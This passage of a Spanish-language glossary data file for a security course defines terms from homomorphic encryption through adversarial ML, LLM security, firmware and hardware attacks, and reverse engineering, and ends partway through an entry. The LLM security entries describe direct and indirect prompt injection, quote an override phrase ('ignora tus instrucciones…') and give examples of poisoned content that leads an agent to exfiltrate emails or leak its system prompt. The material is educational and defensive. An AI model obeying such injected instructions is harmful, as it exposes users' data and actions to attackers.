  // ── M66 · Cifrado Homomórfico ────────────────────────────────────────────
  {
    id: 690,
    module: 66,
    term: "Cifrado homomórfico",
    short: "Computar directamente sobre datos cifrados, sin descifrarlos nunca.",
    detail:
      "El **cifrado homomórfico** permite **operar sobre el texto cifrado** de forma que, al descifrar, se obtiene el resultado de haber operado sobre el texto claro. El dato sensible **nunca** se descifra en el servidor.\n" +
      "> 💡 Idea: enviar datos cifrados a la nube, que los procese a ciegas y devuelva un resultado cifrado que solo tú abres.",
    examples: [
      "Calcular estadísticas sobre datos médicos cifrados en la nube.",
      "Una búsqueda que el servidor resuelve sin ver la consulta.",
    ],
    related: ["Esquemas FHE", "Desafíos de performance", "Secure Multi-Party Computation (MPC)"],
  },
  {
    id: 691,
    module: 66,
    term: "Esquemas FHE",
    short: "Del parcial al totalmente homomórfico: cuántas y qué operaciones se permiten.",
    detail:
      "Se clasifican por qué operaciones soportan:\n" +
      "| Tipo | Operaciones |\n" +
      "|---|---|\n" +
      "| PHE (parcial) | Solo una (suma o producto) |\n" +
      "| SHE (algo) | Ambas, número limitado |\n" +
      "| FHE (total) | Ambas, ilimitadas |\n" +
      "El gran salto fue **Gentry (2009)**, el primer esquema **FHE** viable, usando *bootstrapping* para 'refrescar' el ruido del cifrado.",
    examples: [
      "RSA es homomórfico parcial (para la multiplicación).",
      "Esquemas modernos: BGV, BFV, CKKS (este último para reales).",
    ],
    related: ["Cifrado homomórfico", "Desafíos de performance", "Aplicaciones y límites del FHE"],
  },
  {
    id: 692,
    module: 66,
    term: "Desafíos de performance",
    short: "El FHE funciona, pero es órdenes de magnitud más lento y pesado.",
    detail:
      "El gran freno del FHE es el **coste**: cifrar añade **ruido** que crece con cada operación y obliga a *bootstrapping* (caro); los textos cifrados son **enormes** y las operaciones, **miles de veces más lentas** que en claro. La investigación (y aceleración por hardware) avanza, pero hoy limita su uso a nichos.\n" +
      "> ⚠️ Por eso a menudo se prefiere MPC o enclaves (TEE) cuando el rendimiento importa.",
    examples: [
      "Una operación que en claro es instantánea puede tardar segundos en FHE.",
      "Librerías como Microsoft SEAL u OpenFHE para experimentar.",
    ],
    related: ["Esquemas FHE", "Cifrado homomórfico", "Aplicaciones y límites del FHE"],
  },
  {
    id: 693,
    module: 66,
    term: "Aplicaciones y límites del FHE",
    short: "Cómputo en la nube que preserva la privacidad, donde el coste lo justifique.",
    detail:
      "El FHE brilla cuando la **confidencialidad** vale el coste: análisis de datos médicos/financieros en la nube, ML sobre datos cifrados, consultas privadas. Sus **límites** hoy: rendimiento, complejidad de uso y que no resuelve la **integridad** (hay que combinarlo con otras técnicas).\n" +
      "> 💡 FHE, MPC y ZKP son complementarios: distintos trade-offs de privacidad, cómputo y confianza.",
    examples: [
      "Inferencia de un modelo ML sobre datos cifrados del cliente.",
      "Procesar datos regulados en un cloud no confiable.",
    ],
    related: ["Desafíos de performance", "Esquemas FHE", "Aplicaciones de ZKP/MPC"],
  },

  // ── M67 · Adversarial Machine Learning ───────────────────────────────────
  {
    id: 700,
    module: 67,
    term: "Adversarial examples",
    short: "Entradas con perturbaciones diminutas, imperceptibles, que engañan al modelo.",
    detail:
      "Un **adversarial example** es una entrada modificada con un **ruido mínimo** (invisible para un humano) calculado para que el modelo la **clasifique mal** con alta confianza. Revela que las redes neuronales no 'entienden' como nosotros.\n" +
      "> 💡 El caso clásico: una imagen de un panda + ruido imperceptible que el modelo clasifica como 'gibón' con 99% de confianza.",
    examples: [
      "Una pegatina en una señal de STOP que un coche autónomo lee como '45 km/h'.",
      "Perturbar unos píxeles para evadir un clasificador de imágenes.",
    ],
    related: ["Ataques de evasión", "Data poisoning y backdoors", "Defensas y robustez"],
  },
  {
    id: 701,
    module: 67,
    term: "Ataques de evasión",
    short: "Manipular la entrada en inferencia para que el modelo dé la salida que el atacante quiere.",
    detail:
      "Un **ataque de evasión** ocurre en **tiempo de inferencia**: el atacante altera la entrada (sin tocar el modelo) para **evadir** la detección o forzar una clasificación. Es la categoría más común en producción (antivirus ML, filtros de spam, detección de fraude).\n" +
      "> 💡 Caja blanca (conoce el modelo) vs caja negra (solo observa salidas): los ataques transfieren sorprendentemente bien entre modelos.",
    examples: [
      "Ofuscar un malware para que el clasificador ML lo vea como benigno.",
      "Modificar un email para saltarse el filtro de spam basado en ML.",
    ],
    related: ["Adversarial examples", "Defensas y robustez", "Detección de anomalías en tráfico"],
  },
  {
    id: 702,
    module: 67,
    term: "Data poisoning y backdoors",
    short: "Envenenar los datos de entrenamiento para corromper el modelo o instalarle una puerta trasera.",
    detail:
      "Atacar **antes** del despliegue, en el **entrenamiento**:\n" +
      "• **Poisoning** — inyectar datos malos para degradar el rendimiento del modelo.\n" +
      "• **Backdoor (trojan)** — entrenar el modelo para que se comporte normal salvo cuando ve un **trigger** secreto, ante el cual da la salida elegida por el atacante.\n" +
      "> ⚠️ Crítico cuando se reentrena con datos públicos o se usan modelos/datasets de terceros (supply chain).",
    examples: [
      "Un backdoor que clasifica como 'autorizado' cualquier cara con un sticker concreto.",
      "Envenenar un dataset público scrapeado de Internet.",
    ],
    related: ["Adversarial examples", "ML supply chain", "Defensas y robustez"],
  },
  {
    id: 703,
    module: 67,
    term: "Defensas y robustez",
    short: "Endurecer el modelo contra entradas adversariales (entrenamiento adversarial, detección).",
    detail:
      "No hay bala de plata, pero se combinan defensas:\n" +
      "• **Adversarial training** — entrenar incluyendo ejemplos adversariales (la más efectiva).\n" +
      "• **Detección** de entradas anómalas/adversariales.\n" +
      "• **Destilación defensiva**, sanitización de datos de entrenamiento, ensembles.\n" +
      "> ⚠️ Es una **carrera armamentista**: muchas defensas caen ante ataques adaptativos.",
    examples: [
      "Reentrenar con adversarial examples para subir la robustez.",
      "Un detector que rechaza entradas fuera de la distribución.",
    ],
    related: ["Ataques de evasión", "Adversarial examples", "Data poisoning y backdoors"],
  },

  // ── M68 · Privacy Attacks on ML ──────────────────────────────────────────
  {
    id: 710,
    module: 68,
    term: "Model extraction",
    short: "Robar un modelo consultándolo: reconstruir una copia funcional desde sus respuestas.",
    detail:
      "El **model extraction** (model stealing) reconstruye un modelo **propietario** consultándolo muchas veces (vía su API) y entrenando un sustituto con los pares entrada/salida. Roba la **propiedad intelectual** y, además, el sustituto facilita ataques de evasión en caja blanca.\n" +
      "> ⚠️ Por eso las APIs de ML aplican rate limiting y vigilan patrones de consulta sospechosos.",
    examples: [
      "Clonar un clasificador de pago consultándolo masivamente.",
      "Entrenar un sustituto local para luego generar adversarial examples.",
    ],
    related: ["Membership inference", "Model inversion", "Ataques de evasión"],
  },
  {
    id: 711,
    module: 68,
    term: "Membership inference",
    short: "Determinar si un dato concreto formó parte del entrenamiento del modelo.",
    detail:
      "Un ataque de **membership inference** decide si un **registro específico** estuvo en el set de entrenamiento, observando la **confianza** del modelo (suele estar más seguro con datos que ya vio). Es un problema de **privacidad** grave si el dataset es sensible.\n" +
      "> ⚠️ Saber que la historia clínica de alguien estuvo en el entrenamiento de un modelo de cáncer ya filtra información privada.",
    examples: [
      "Inferir que un paciente estuvo en el dataset de un modelo médico.",
      "El sobreajuste (overfitting) agrava la fuga: el modelo 'memoriza'.",
    ],
    related: ["Model inversion", "Differential privacy", "Model extraction"],
  },
  {
    id: 712,
    module: 68,
    term: "Model inversion",
    short: "Reconstruir datos de entrenamiento (o atributos sensibles) a partir del modelo.",
    detail:
      "La **model inversion** reconstruye **características de los datos de entrenamiento** explotando el modelo: por ejemplo, recuperar una cara representativa de una clase, o inferir atributos sensibles. Los LLMs pueden además **regurgitar** verbatim datos memorizados (PII, secretos).\n" +
      "> ⚠️ Modelos entrenados con datos personales pueden filtrarlos al ser interrogados con astucia.",
    examples: [
      "Reconstruir una imagen reconocible de una persona del set de entrenamiento.",
      "Un LLM que repite una clave de API vista en su corpus.",
    ],
    related: ["Membership inference", "Differential privacy", "Fuga de datos y output handling"],
  },
  {
    id: 713,
    module: 68,
    term: "Differential privacy",
    short: "Añadir ruido calibrado para que ningún individuo se pueda distinguir en los resultados.",
    detail:
      "La **privacidad diferencial (DP)** es la principal defensa: añade **ruido matemáticamente calibrado** de modo que la presencia o ausencia de **un individuo** no cambie apreciablemente el resultado. Da una **garantía formal** de privacidad (parámetro ε), a costa de algo de precisión.\n" +
      "> 💡 Se aplica al entrenamiento (DP-SGD) o a las consultas agregadas.",
    examples: [
      "DP-SGD para entrenar un modelo con garantía de privacidad.",
      "Estadísticas agregadas con ruido para no exponer a nadie.",
    ],
    related: ["Membership inference", "Model inversion", "Cifrado homomórfico"],
  },

  // ── M69 · LLM Security ───────────────────────────────────────────────────
  {
    id: 720,
    module: 69,
    term: "OWASP LLM Top 10",
    short: "Los 10 riesgos de seguridad más críticos en aplicaciones con LLMs.",
    detail:
      "El **OWASP Top 10 for LLM Applications** estandariza los riesgos propios de las apps con modelos de lenguaje, encabezados por la **prompt injection**. Es la referencia para auditar chatbots, copilots y agentes.\n" +
      "> 💡 Ver el diagrama 'OWASP LLM Top 10' con los 10 riesgos y su mitigación.",
    examples: [
      "Usar el OWASP LLM Top 10 como checklist al integrar un chatbot.",
      "Mapear los hallazgos de un pentest de IA a sus categorías.",
    ],
    related: ["Prompt injection y jailbreaks", "Fuga de datos y output handling", "RAG y agentes"],
  },
  {
    id: 721,
    module: 69,
    term: "Prompt injection y jailbreaks",
    short: "Instrucciones maliciosas que secuestran al LLM para que ignore sus reglas.",
    detail:
      "La **prompt injection** inyecta instrucciones que el modelo obedece como si fueran legítimas:\n" +
      "• **Directa (jailbreak)** — el usuario manipula al modelo para saltarse sus restricciones ('ignora tus instrucciones…').\n" +
      "• **Indirecta** — el payload viene en **contenido externo** que el LLM procesa (una web, un email, un documento en un RAG).\n" +
      "> ⚠️ La indirecta es la más peligrosa en agentes: una web envenenada puede hacer que el agente exfiltre datos o ejecute acciones.",
    examples: [
      "Un comentario en una web que ordena al agente 'envía los emails a X'.",
      "Un jailbreak que extrae el system prompt o contenido prohibido.",
    ],
    related: ["OWASP LLM Top 10", "RAG y agentes", "Fuga de datos y output handling"],
  },
  {
    id: 722,
    module: 69,
    term: "Fuga de datos y output handling",
    short: "El LLM puede filtrar datos sensibles, y su salida no debe tratarse como confiable.",
    detail:
      "Dos riesgos ligados:\n" +
      "• **Fuga de datos** — el modelo revela su **system prompt**, datos de entrenamiento o información de otros usuarios/contexto.\n" +
      "• **Insecure output handling** — tratar la salida del LLM como confiable: si se inserta en HTML (XSS), en una shell (RCE) o en una query (SQLi), es inyección clásica.\n" +
      "> ⚠️ Regla: la salida de un LLM es **entrada no confiable**; validar/escapar antes de usarla.",
    examples: [
      "Un chatbot que revela su system prompt con la pregunta adecuada.",
      "Insertar la respuesta del LLM en la página sin escapar → XSS.",
    ],
    related: ["Prompt injection y jailbreaks", "Model inversion", "Prevención de inyección"],
  },
  {
    id: 723,
    module: 69,
    term: "RAG y agentes",
    short: "Darle al LLM herramientas y datos externos amplía su poder — y su superficie de ataque.",
    detail:
      "• **RAG** (*Retrieval-Augmented Generation*) — el LLM consulta una base de conocimiento; si esa fuente está envenenada, sufre **prompt injection indirecta**.\n" +
      "• **Agentes** — el LLM puede **ejecutar acciones** (APIs, código, email). La **excessive agency** (demasiados permisos) convierte una inyección en daño real.\n" +
      "> 💡 Defensa: mínimo privilegio de las herramientas, **human-in-the-loop** para acciones sensibles, y aislar/validar las fuentes del RAG.",
    examples: [
      "Un agente con acceso al correo que, tras una inyección, exfiltra datos.",
      "Envenenar un documento del RAG para manipular las respuestas.",
    ],
    related: ["Prompt injection y jailbreaks", "OWASP LLM Top 10", "Principio de mínimo privilegio"],
  },

  // ── M70 · MLSecOps y ML Supply Chain ─────────────────────────────────────
  {
    id: 730,
    module: 70,
    term: "ML supply chain",
    short: "Modelos, datasets y librerías de terceros heredan (y propagan) riesgo.",
    detail:
      "El ML moderno reúsa **modelos pre-entrenados**, **datasets** y librerías de hubs públicos (Hugging Face, etc.). Cada pieza es un eslabón de **cadena de suministro**: un modelo con backdoor, un dataset envenenado o una dependencia comprometida infectan todo lo que los usa.\n" +
      "> ⚠️ Descargar y ejecutar un modelo de origen desconocido es como ejecutar un binario desconocido.",
    examples: [
      "Un modelo popular en un hub con un backdoor oculto.",
      "Typosquatting de un paquete de ML para colar código malicioso.",
    ],
    related: ["Serialización insegura", "Provenance e integridad", "Vulnerable and Outdated Components"],
  },
  {
    id: 731,
    module: 70,
    term: "Serialización insegura",
    short: "Cargar un modelo en formato pickle puede ejecutar código arbitrario.",
    detail:
      "Muchos modelos se distribuyen en **pickle** (Python), un formato que **ejecuta código** al deserializar: cargar un `.pkl`/`.pt` malicioso es **RCE directo**. Por eso se prefieren formatos seguros como **safetensors**, que solo contienen tensores sin código.\n" +
      "> ⚠️ `torch.load`/`pickle.load` de un archivo no confiable ejecuta lo que el atacante quiera.",
    examples: [
      "Un checkpoint .pt que abre una reverse shell al cargarse.",
      "Migrar a safetensors para eliminar el vector de pickle.",
    ],
    related: ["ML supply chain", "Provenance e integridad", "Software and Data Integrity Failures"],
  },
  {
    id: 732,
    module: 70,
    term: "Provenance e integridad",
    short: "Saber de dónde viene cada modelo/dato y verificar que no fue alterado.",
    detail:
      "Defensa de la supply chain: **provenance** (rastro verificable del origen y el proceso de creación) e **integridad** (firmas y hashes). Se materializa en **firmar modelos**, un **ML-BOM** (inventario de componentes del modelo) y verificar la procedencia antes de desplegar.\n" +
      "> 💡 Es el equivalente, en ML, de firmar artefactos y mantener un SBOM en DevSecOps.",
    examples: [
      "Firmar y verificar el modelo antes de promoverlo a producción.",
      "Un ML-BOM que lista datasets, pesos y dependencias usados.",
    ],
    related: ["Serialización insegura", "ML supply chain", "Seguridad del pipeline ML (MLSecOps)"],
  },
  {
    id: 733,
    module: 70,
    term: "Seguridad del pipeline ML (MLSecOps)",
    short: "Llevar las prácticas DevSecOps al ciclo de vida del machine learning.",
    detail:
      "**MLSecOps** integra seguridad en todo el pipeline de ML: datos, entrenamiento, registro de modelos, despliegue y monitoreo. Añade controles propios — **escaneo de modelos** (backdoors/pickle), validación de datos, **mínimo privilegio** del pipeline, y monitoreo de **drift** y de ataques en inferencia.\n" +
      "> 💡 Es el shift-left aplicado a ML: atrapar el riesgo en los datos y el entrenamiento, no en producción.",
    examples: [
      "Escanear cada modelo en el CI antes de registrarlo.",
      "Monitorear la inferencia para detectar evasión/abuso.",
    ],
    related: ["Provenance e integridad", "ML supply chain"],
  },

  // ── M71 · Side-Channels Microarquitectónicos ─────────────────────────────
  {
    id: 740,
    module: 71,
    term: "Ejecución especulativa y transiente",
    short: "La CPU adelanta trabajo que quizá no haga; ese trabajo 'especulativo' deja rastros.",
    detail:
      "Para ir más rápido, la CPU **ejecuta especulativamente** instrucciones antes de saber si hacían falta (predicción de saltos). Si se equivoca, **descarta** el resultado arquitectónico — pero los **efectos secundarios** (estado de la caché) **persisten**. Esa ejecución **transiente** es la base de Spectre/Meltdown.\n" +
      "> 💡 La clave: lo descartado a nivel arquitectónico sigue siendo observable a nivel microarquitectónico.",
    examples: [
      "Un acceso especulativo a memoria prohibida que igual toca la caché.",
      "Predecir mal un salto y dejar datos secretos cacheados.",
    ],
    related: ["Spectre y Meltdown", "Cache side-channels", "Variantes y mitigaciones"],
  },
  {
    id: 741,
    module: 71,
    term: "Spectre y Meltdown",
    short: "Dos fallos de 2018 que rompen el aislamiento de memoria abusando de la especulación.",
    detail:
      "Ambos (2018) usan ejecución especulativa para leer memoria que no deberían:\n" +
      "• **Meltdown** — rompe la barrera usuario↔kernel; un proceso lee memoria del kernel.\n" +
      "• **Spectre** — engaña a otro proceso (o al kernel) para que filtre sus propios datos vía especulación.\n" +
      "> ⚠️ Afectaron a casi todas las CPUs de la década; las mitigaciones (KPTI, retpoline) tienen coste de rendimiento.",
    examples: [
      "Meltdown leyendo /etc/shadow desde un proceso sin privilegios.",
      "Spectre filtrando datos a través de un sandbox de JavaScript.",
    ],
    related: ["Ejecución especulativa y transiente", "Cache side-channels", "Variantes y mitigaciones"],
  },
  {
    id: 742,
    module: 71,
    term: "Cache side-channels",
    short: "Medir tiempos de acceso a la caché revela qué datos tocó otro proceso.",
    detail:
      "La caché es compartida, así que los **tiempos de acceso** filtran información: un dato en caché se lee rápido; fuera, lento. Técnicas:\n" +
      "• **Flush+Reload** — vaciar una línea, esperar, y medir si la víctima la recargó.\n" +
      "• **Prime+Probe** — llenar la caché y ver qué evicta la víctima.\n" +
      "> 💡 Es el 'canal de salida' que convierte la fuga especulativa de Spectre en datos legibles.",
    examples: [
      "Flush+Reload para recuperar bytes leídos especulativamente.",
      "Espiar una operación de cifrado por sus accesos a tablas.",
    ],
    related: ["Spectre y Meltdown", "Side-channel attacks", "Variantes y mitigaciones"],
  },
  {
    id: 743,
    module: 71,
    term: "Variantes y mitigaciones",
    short: "El fenómeno se extendió (MDS, ZombieLoad); las defensas combinan microcódigo, SO y compilador.",
    detail:
      "Tras Spectre/Meltdown llegaron muchas variantes (**MDS**, **ZombieLoad**, **Foreshadow**, **RIDL**) que filtran desde buffers internos. Las mitigaciones se reparten:\n" +
      "• **Microcódigo/CPU** — parches del fabricante, nuevas instrucciones.\n" +
      "• **SO** — **KPTI** (aísla tablas de páginas), flush de buffers al cambiar de contexto.\n" +
      "• **Compilador** — **retpoline** contra la inyección de objetivos de salto.\n" +
      "> ⚠️ Casi todas tienen un **coste de rendimiento**: es un trade-off seguridad/velocidad.",
    examples: [
      "Desactivar hyper-threading en entornos multi-tenant sensibles.",
      "Retpoline en el kernel para neutralizar Spectre v2.",
    ],
    related: ["Spectre y Meltdown", "Cache side-channels", "Mitigaciones de kernel"],
  },

  // ── M72 · Fault Injection y Hardware Attacks ─────────────────────────────
  {
    id: 750,
    module: 72,
    term: "Fault injection (glitching)",
    short: "Provocar un fallo físico momentáneo para que el chip se 'salte' una comprobación.",
    detail:
      "La **inyección de fallos** perturba el chip en un instante preciso para corromper su ejecución (saltarse un `if`, una verificación de PIN, una firma). Vectores: **voltage glitching** (bajón de tensión), **clock glitching**, **EM** (pulso electromagnético) y **láser**.\n" +
      "> 💡 Un glitch en el momento justo puede convertir un 'acceso denegado' en 'acceso concedido'.",
    examples: [
      "Saltarse la verificación de firma del bootloader con un glitch de voltaje.",
      "Forzar un bypass de PIN en un chip seguro con un pulso EM.",
    ],
    related: ["Power/EM analysis", "Implantes y tampering", "Contramedidas de hardware"],
  },
  {
    id: 751,
    module: 72,
    term: "Power/EM analysis",
    short: "El consumo eléctrico y la emisión EM del chip filtran las operaciones que ejecuta.",
    detail:
      "El **análisis de consumo** observa cuánta energía/EM gasta el chip mientras opera:\n" +
      "• **SPA** (simple) — leer directamente el patrón (ej. ver las rondas de RSA).\n" +
      "• **DPA** (diferencial) — estadística sobre muchas trazas para extraer bits de clave.\n" +
      "Son **side-channels físicos** muy potentes contra implementaciones de cripto sin proteger.\n" +
      "> ⚠️ Recuperar una clave AES por DPA es viable con el equipo adecuado y suficientes trazas.",
    examples: [
      "Extraer una clave de una smartcard midiendo su consumo.",
      "SPA revelando los exponentes de una operación RSA.",
    ],
    related: ["Fault injection (glitching)", "Side-channel attacks", "Contramedidas de hardware"],
  },
  {
    id: 752,
    module: 72,
    term: "Implantes y tampering",
    short: "Modificar físicamente el hardware: implantes, sondas y manipulación de chips.",
    detail:
      "El acceso físico permite **manipular** el hardware: **implantes** maliciosos en una placa o cable (ej. cables USB con chip espía), **sondas** sobre buses para leer datos (bus snooping), y **decapsulado/microprobing** de chips. Es el terreno del espionaje y los ataques de cadena de suministro de hardware.",
    examples: [
      "Un cable de carga con un implante que registra pulsaciones.",
      "Sondar el bus SPI para leer el firmware mientras arranca.",
    ],
    related: ["Fault injection (glitching)", "Contramedidas de hardware", "ML supply chain"],
  },
  {
    id: 753,
    module: 72,
    term: "Contramedidas de hardware",
    short: "Sensores, blindaje, redundancia y código constant-time para resistir ataques físicos.",
    detail:
      "Defensas contra fault injection y side-channels físicos:\n" +
      "• **Sensores** de voltaje/reloj/luz que detectan glitches y bloquean el chip.\n" +
      "• **Redundancia** — ejecutar dos veces y comparar; verificaciones repetidas.\n" +
      "• **Blindaje/mallas** anti-tampering que borran secretos si se perforan.\n" +
      "• **Constant-time + enmascaramiento** contra el análisis de consumo.\n" +
      "> 💡 Los **Secure Elements** y HSM integran muchas de estas defensas certificadas.",
    examples: [
      "Un Secure Element que borra sus claves al detectar manipulación.",
      "Enmascaramiento de la cripto para frustrar el DPA.",
    ],
    related: ["Fault injection (glitching)", "Power/EM analysis", "Root of trust"],
  },

  // ── M73 · Firmware, UEFI y Secure Boot ───────────────────────────────────
  {
    id: 760,
    module: 73,
    term: "La boot chain (cadena de confianza)",
    short: "El arranque es una cadena donde cada etapa verifica la firma de la siguiente.",
    detail:
      "El arranque seguro es una **cadena de confianza**: una **raíz** inmutable (ROM/hardware) verifica el bootloader, que verifica el kernel, que verifica el SO. Si un eslabón no valida al siguiente, la cadena se rompe.\n" +
      "> 💡 La seguridad nace de un **root of trust** anclado en hardware; sin él, todo lo de arriba es falsificable. Ver el diagrama 'Cadena de arranque seguro'.",
    examples: [
      "Boot ROM → UEFI → bootloader → kernel, cada uno firmado.",
      "Si el bootloader no está firmado, Secure Boot detiene el arranque.",
    ],
    related: ["Seguridad UEFI", "Ataques de firmware", "Root of trust"],
  },
  {
    id: 761,
    module: 73,
    term: "Seguridad UEFI",
    short: "El firmware moderno (UEFI) es potente y complejo: superficie de ataque privilegiada.",
    detail:
      "**UEFI** reemplazó a la BIOS con un firmware rico (red, drivers, shell). Esa complejidad es superficie de ataque a **nivel pre-SO**, con privilegios máximos. **SMM** (*System Management Mode*) es un modo aún más privilegiado (ring -2) y un objetivo codiciado.\n" +
      "> ⚠️ Un compromiso de UEFI/SMM sobrevive a reinstalar el SO y es muy difícil de detectar.",
    examples: [
      "Un implante en SMM invisible para el sistema operativo.",
      "Variables NVRAM de UEFI manipuladas para persistencia.",
    ],
    related: ["La boot chain (cadena de confianza)", "Ataques de firmware", "Defensas de firmware (chipsec)"],
  },
  {
    id: 762,
    module: 73,
    term: "Ataques de firmware",
    short: "Bootkits y troyanos de firmware que persisten por debajo del sistema operativo.",
    detail:
      "Atacar el firmware da **persistencia profunda**: un **bootkit** infecta el arranque para cargarse antes que el SO; ataques como **Thunderspy** (DMA por Thunderbolt) o implantes de UEFI (LoJax, MoonBounce) sobreviven al formateo. Son el arma de APTs por su sigilo.\n" +
      "> ⚠️ Sobreviven a reinstalar el SO e incluso a cambiar el disco.",
    examples: [
      "LoJax, el primer bootkit de UEFI visto in-the-wild (APT28).",
      "Un ataque DMA que lee la RAM por un puerto Thunderbolt.",
    ],
    related: ["Seguridad UEFI", "La boot chain (cadena de confianza)"],
  },
  {
    id: 763,
    module: 73,
    term: "Defensas de firmware (chipsec)",
    short: "Secure Boot, measured boot y herramientas para auditar el firmware.",
    detail:
      "Defensas clave del arranque:\n" +
      "• **Secure Boot** — solo ejecuta componentes con firma confiable.\n" +
      "• **Measured Boot** — mide (hashea) cada etapa en el **TPM** para attestation.\n" +
      "• **BootGuard / protección de la flash** contra escritura no autorizada.\n" +
      "• **chipsec** — framework para **auditar** la configuración de seguridad del firmware.\n" +
      "> 💡 Measured boot no impide el arranque malicioso, pero lo **detecta** vía attestation.",
    examples: [
      "chipsec verificando que la protección de escritura de la flash está activa.",
      "Secure Boot rechazando un bootloader sin firma válida.",
    ],
    related: ["Ataques de firmware", "TPM y attestation", "La boot chain (cadena de confianza)"],
  },

  // ── M74 · Trusted Execution y Roots of Trust ─────────────────────────────
  {
    id: 770,
    module: 74,
    term: "Root of trust",
    short: "El ancla de confianza inmutable de la que depende toda la seguridad del sistema.",
    detail:
      "Un **root of trust (RoT)** es un componente — idealmente en **hardware** — en el que se confía por diseño, porque no se puede modificar: claves grabadas, código de arranque en ROM, un Secure Element. Toda la cadena de confianza (boot, attestation, cifrado) **cuelga** de él.\n" +
      "> 💡 La seguridad no se crea de la nada: se **ancla** en un root of trust y se propaga hacia arriba.",
    examples: [
      "Una clave de fábrica en fusibles (eFuse) que no se puede leer ni cambiar.",
      "El código de Boot ROM como raíz de la cadena de arranque.",
    ],
    related: ["TPM y attestation", "TEEs y confidential computing", "La boot chain (cadena de confianza)"],
  },
  {
    id: 771,
    module: 74,
    term: "TPM y attestation",
    short: "Un chip que custodia claves y mide el estado del sistema para probar su integridad.",
    detail:
      "El **TPM** (*Trusted Platform Module*) es un chip seguro que **genera/almacena claves** y guarda **mediciones** (hashes del arranque) en sus PCRs. La **attestation** usa esas mediciones, firmadas por el TPM, para **probar a un tercero** que el sistema arrancó en un estado confiable (measured boot).\n" +
      "> 💡 Es la base de BitLocker, de la attestation remota y del arranque verificado en Windows.",
    examples: [
      "Remote attestation antes de dar acceso a una red corporativa.",
      "BitLocker sellando la clave de disco al estado del TPM.",
    ],
    related: ["Root of trust", "Defensas de firmware (chipsec)", "TEEs y confidential computing"],
  },
  {
    id: 772,
    module: 74,
    term: "TEEs y confidential computing",
    short: "Enclaves aislados por hardware donde el código y los datos corren protegidos incluso del SO.",
    detail:
      "Un **TEE** (*Trusted Execution Environment*) crea un **enclave** cifrado y aislado por hardware donde correr código sensible, protegido incluso de un **SO o hypervisor comprometido**. Tecnologías: **Intel SGX**, **AMD SEV**, **ARM TrustZone**. Es la base del **confidential computing** (procesar datos cifrados en la nube sin que el proveedor los vea).",
    examples: [
      "Procesar datos médicos en un enclave SGX en un cloud no confiable.",
      "TrustZone aislando el procesamiento de huellas en un móvil.",
    ],
    related: ["Root of trust", "Ataques y límites de los TEEs", "Cifrado homomórfico"],
  },
  {
    id: 773,
    module: 74,
    term: "Ataques y límites de los TEEs",
    short: "Los enclaves no son mágicos: caen ante side-channels y tienen un modelo de amenaza acotado.",
    detail:
      "Los TEEs **reducen** la superficie pero no la eliminan. Han caído ante **side-channels** (Foreshadow/L1TF contra SGX, side-channels de SEV) y **no protegen** contra bugs dentro del propio enclave. Su modelo de amenaza es **específico**: hay que entender qué garantizan y qué no.\n" +
      "> ⚠️ Confiar ciegamente en 'está en un enclave, es seguro' es un error: el enclave también se audita.",
    examples: [
      "Foreshadow (L1TF) extrayendo secretos de un enclave SGX.",
      "Un bug de memoria dentro del enclave que lo compromete igual.",
    ],
    related: ["TEEs y confidential computing", "Spectre y Meltdown", "Root of trust"],
  },

  // ── M75 · Reverse Engineering Avanzado ───────────────────────────────────
  {
    id: 780,
    module: 75,
    term: "RE workflow avanzado",
    short: "El método maduro: triage rápido, foco en la lógica clave, no leer todo línea a línea.",
    detail:
      "Un RE eficiente sigue un **workflow**: triage (hashes, strings, imports), localizar funciones de interés, decompilar y **anotar** (tipos, nombres), correlacionar estático y dinámico, y documentar hipótesis. La meta no es entender todo, sino la **lógica relevante** (config de C2, rutina de cifrado, anti-análisis).\n" +
      "> 💡 Renombrar y tipar en el decompilador transforma 100 líneas ilegibles en algo leíble.",
    examples: [
      "Triagear con `file`/`strings`/`yara` antes de abrir Ghidra.",
      "Anotar tipos de struct para que el decompilador genere C limpio.",
    ],
    related: ["Anti-análisis y obfuscación", "Deobfuscación", "Tooling (Ghidra/Frida/Unicorn)"],
  },
  {
    id: 781,
    module: 75,
    term: "Anti-análisis y obfuscación",
    short: "El malware se defiende: detecta VMs, depuradores y se ofusca para que no lo leas.",
    detail:
      "Técnicas comunes de **anti-análisis**:\n" +
      "• **Anti-debug** — `IsDebuggerPresent`, timing checks, excepciones.\n" +
      "• **Anti-VM** — buscar artefactos de VirtualBox/VMware/sandboxes.\n" +
      "• **Anti-disassembly** — saltos calculados, basura entre instrucciones.\n" +
      "• **Ofuscación** — strings cifrados, control flow flattening, packers.\n" +
      "> ⚠️ Saltarse el anti-análisis a mano (parchear el binario, hookear APIs) es paso uno.",
    examples: [
      "Parchear `IsDebuggerPresent` para que siempre devuelva 0.",
      "Strings descifrados al vuelo que no aparecen con `strings`.",
    ],
    related: ["Deobfuscación", "Unpacking y deofuscación", "Tooling (Ghidra/Frida/Unicorn)"],
  },
  {
    id: 782,
    module: 75,
    term: "Deobfuscación",
    short: "Revertir la ofuscación: scripts, emulación parcial y análisis de patrones.",
    detail:
      "**Deobfuscar** es revertir capas: descifrar strings, aplanar control flow, identificar **virtualization-based obfuscation** (VMProtect, Themida) y reconstruir la lógica original. Combina **scripting** en el decompilador (Ghidra/IDA), **emulación** (Unicorn) para tramos concretos y **patrón sobre patrón**.\n" +
      "> 💡 Para strings cifrados, escribir un script que invoque el mismo desencriptor revela todo el catálogo de una vez.",
    examples: [
      "Script de Ghidra que descifra todas las strings de una familia.",
      "Emular con Unicorn una rutina ofuscada para ver su salida.",
    ],
    related: ["Anti-análisis y obfuscación", "Tooling (Ghidra/Frida/Unicorn)", "Ejecución simbólica"],
  },
  {
    id: 783,
    module: 75,
    term: "Tooling (Ghidra/Frida/Unicorn)",
    short: "Estático (Ghidra), dinámico instrumentado (Frida) y emulación (Unicorn) — combinados.",
    detail:
      "Trío estrella del RE moderno:\n" +
      "| Herramienta | Para qué |\n" +
      "|---|---|\n" +
      "| Ghidra / IDA | Disasm + decompiler + scripting |\n" +
      "| Frida | Hookear funciones en runtime (móvil, desktop) |\n" +
      "| Unicorn | Emular CPU sin SO (deobf, prototipos) |\n" +
      "> 💡 Frida cambió el RE de apps móviles: hookear sin recompilar la app.",
    examples: [
      "Frida script que loguea cada llamada a `decrypt_string`.",
      "Unicorn ejecutando una rutina aislada con memoria controlada.",
    ],
    related: ["RE workflow avanzado", "Deobfuscación", "Ejecución simbólica"],
  },

  // ── M76 · Ejecución Simbólica y Concólica ────────────────────────────────
  {
    id: 790,
    module: 76,
    term: "Ejecución simbólica",
    short: "Ejecutar el programa con valores 'simbólicos' para explorar todos los caminos posibles.",
    detail:
